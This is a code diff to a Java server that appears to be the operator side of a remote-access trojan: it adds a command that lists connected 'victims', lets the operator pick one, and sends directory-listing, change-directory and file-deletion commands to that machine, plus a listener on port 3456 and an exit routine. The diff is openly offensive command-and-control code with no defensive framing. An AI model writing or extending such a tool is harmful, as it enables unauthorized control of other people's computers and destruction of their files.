@@ -4,6 +4,8 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.util.Scanner;
 
+import org.graalvm.compiler.nodes.memory.MemoryCheckpoint.Multi;
+
 
 class MultipleClients extends Thread {
     public boolean flag;
@@ -138,11 +140,109 @@ class MessageSender extends Thread {
                             System.out.println("Id not found try again later\n");
                         }
                         break;
+                        
+                        /*        Handling Users        */
+
+                        case "/file_handler":
+                        System.out.println("\n\nDisplaying victim's List \n\n");
+                        System.out.println("ID\tServer");
+                        for(int i=0; i<MultipleClients.clientCount; i++) {
+                            if(MultipleClients.socket[i].getReuseAddress() == false) {
+                                System.out.println(i+"\t"+MultipleClients.socket[i]);
+                            }
+                        }
+
+                        System.out.print("\n\nEnter ID: ");
+                        message = read.nextLine();
+                        id = Integer.parseInt(message);
+
+                        if(id<MultipleClients.clientCount) {
+                            if(MultipleClients.socket[id].getReuseAddress() == false) {
+                                dos = new DataOutputStream(MultipleClients.socket[id].getOutputStream());
+                                System.out.println("Connected. Start chatting./stop to disconnect");
+                                
+                                while(true) {
+                                    message = read.nextLine();
+                                    if(message.equals("ls")) {
+                                        if(MultipleClients.socket[id].getReuseAddress() == false) {
+                                            dos.writeUTF("fileListing()");
+                                        }
+                                        else {
+                                            System.out.println("System is not able to send a message.");
+                                        }
+                                    }
+                                    else if(message.equals("cd")){
+                                        if(MultipleClients.socket[id].getReuseAddress() == false) {
+                                            dos.writeUTF("changeDir()");
+                                            System.out.print("Enter the dir name: ");
+                                            message = read.nextLine();
+                                            dos.writeUTF(message);
+                                        }
+                                        else{
+                                            System.out.println("System is not able to send a message.");
+                                        }
+                                    }
+                                    else if(message.equals("rm")) {
+                                        if(MultipleClients.socket[id].getReuseAddress() == false){
+                                            dos.writeUTF("remove()");
+                                            System.out.print("Enter the file name: ");
+                                            message = read.nextLine();
+                                            dos.writeUTF(message);
+                                        }
+                                        else {
+                                            System.out.println("System is not able to send a message.");
+                                        }
+                                    }
+                                    else if(message.equals("/stop")) {
+                                        System.out.println("\n\n Disconnected\n\n");
+                                        break;
+                                    }
+                                }
+                            }
+                            else{
+                                System.out.println("Id not found try again later.");
+                                break;
+                            }
+                        }
+                        else {
+                            System.out.println("Id not found try again later.");
+                        }
+                        break;
+
+                        /*
+                            Exiting Application
+                        */
+                        case "/exit":
+                            System.out.print("Closing all connection.....");
+                            if(MultipleClients.clientCount>0){
+                                for(int i=0; i<MultipleClients.clientCount; i++) {
+                                    MultipleClients.socket[i].close();
+                                }
+                            }
+                            System.out.println("done");
+                            System.out.print("Exiting from application....");
+                            System.out.println("done");
+                            Server.serverSocket.close();
+                            System.exit(0);
                 }
             }
         }
         catch(Exception e) {
-
         }
+    }
+}
+
+class Server {
+    public static ServerSocket serverSocket;
+    public Server() throws Exception {
+        serverSocket = new ServerSocket(3456);
+        MultipleClients multipleClients = new MultipleClients();
+        multipleClients.start();
+        MessageSender sender = new MessageSender();
+        sender.start();
+    }
+
+    public static void main(String args[]) throws Exception {
+        Server s = new Server();
     }
 }
